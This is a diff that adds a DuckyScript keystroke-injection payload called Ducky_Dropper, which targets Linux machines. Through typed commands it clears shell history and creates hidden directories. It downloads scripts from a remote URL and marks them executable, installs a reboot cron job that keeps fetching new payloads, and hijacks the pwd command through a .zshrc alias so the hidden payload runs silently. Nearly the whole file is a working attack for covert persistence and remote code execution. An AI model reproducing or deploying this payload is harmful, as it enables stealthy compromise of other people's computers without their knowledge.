@@ -1,0 +1,32 @@
+REM TITLE: Ducky_Dropper
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Kali Linux release 2025.2)
+REM DESCRIPTION: --> See README.md for full information (https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/README.md) <--
+REM DESCRIPTION: This is the delivery system for the initial gathering and setup of Ducky_Dropper (cron_dropper.sh and payload.sh). It gathers the scripts, gives them execution permissions, places them in hidden directories, creates a cronjob that will call for new payloads 60 seconds after machine boot (cron_dropper.sh), and binds the pwd command to execute payload.sh.
+REM DESCRIPTION: The source to your cron_dropper.sh script must be added to line 8 and source to your payload added to line 9. Ducky_Dropper scripts have been added for demonstration purposes, replace with your own.
+
+DEFINE #CRON_DROPPER https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/cron_dropper.sh
+DEFINE #PAYLOAD https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening terminal:
+CTRL ALT t
+DELAY 300
+
+REM Unsetting terminal history, creating directories to host scripts, grabbing cron_dropper.sh and payload.sh:
+STRINGLN unset HISTFILE
+STRINGLN mkdir /home/$USER/.cronfg && mkdir /home/$USER/.confg
+STRINGLN wget -q -P /home/$USER/.cronfg #CRON_DROPPER
+STRINGLN wget -q -P /home/$USER/.confg #PAYLOAD
+
+REM Giving execution permissions to cron_dropper.sh & payload.sh, and adding cron_dropper.sh to crontab to be executed 60 seconds after reboot to fetch updated payloads:
+STRINGLN chmod +x /home/$USER/.confg/*.sh; chmod +x /home/$USER/.cronfg/*.sh; crontab -l > crontemp; echo "@reboot sleep 60 && ~/.cronfg/cron_dropper.sh" >> crontemp; crontab crontemp; rm -f crontemp
+
+REM Binding payload.sh execution to pwd command, exiting terminal:
+STRINGLN cat >> .zshrc
+STRINGLN alias pwd='pwd; (/home/$USER/.confg/*.sh > /dev/null 2>&1 & )'
+CTRL c
+STRINGLN exit
